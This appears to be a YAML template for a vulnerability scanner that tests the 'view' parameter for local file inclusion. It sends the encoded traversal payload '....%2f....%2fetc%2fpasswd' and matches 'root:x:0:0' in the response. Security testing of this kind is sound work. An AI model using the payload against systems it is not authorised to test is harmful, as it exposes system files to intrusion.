id: lfi-006
name: 'Path traversal via view'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads /etc/passwd via view'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - '....%2f....%2fetc%2fpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
